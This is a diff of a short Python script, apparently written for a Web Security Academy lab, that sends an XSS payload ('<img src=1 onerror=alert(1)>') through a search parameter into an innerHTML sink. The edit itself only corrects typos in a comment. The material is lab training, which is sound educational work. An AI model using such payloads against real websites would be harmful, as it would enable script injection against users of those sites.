@@ -22,7 +22,7 @@ import requests
 
 
 lab_id = '0a0600c6039610d68208ce7000db0014' #change based on generated lab
-payload = "<img src=1 onerror=alert(1)>" # search paramter pouplates location.serach source and innerHTML sink despoits malicious code
+payload = "<img src=1 onerror=alert(1)>" # search parameter populates location.search source and innerHTML sink deposits malicious code
 uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 
 
 r = requests.get(uri)
